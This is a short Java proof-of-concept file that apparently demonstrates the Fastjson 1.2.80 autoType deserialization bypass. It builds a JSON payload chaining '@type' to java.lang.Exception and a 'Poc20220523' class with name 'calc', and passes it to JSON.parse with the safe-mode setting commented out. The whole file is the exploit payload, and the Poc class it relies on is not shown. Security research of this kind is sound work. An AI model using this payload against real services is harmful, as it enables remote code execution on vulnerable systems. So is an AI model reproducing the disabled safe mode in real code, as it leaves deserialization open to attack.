import com.alibaba.fastjson.JSON;

/**
 * Created by xjj on 2023/3/9.
 */
public class FastJson10_LE1280 {
    // https://y4er.com/posts/fastjson-1.2.80/
//    static {
//        ParserConfig.getGlobalInstance().setSafeMode(true);
//    }
    public static void main(String[] args) {
        String json = "{\"@type\":\"java.lang.Exception\",\"@type\":\"Poc20220523\",\"name\":\"calc\"}";
        JSON.parse(json);
    }
}
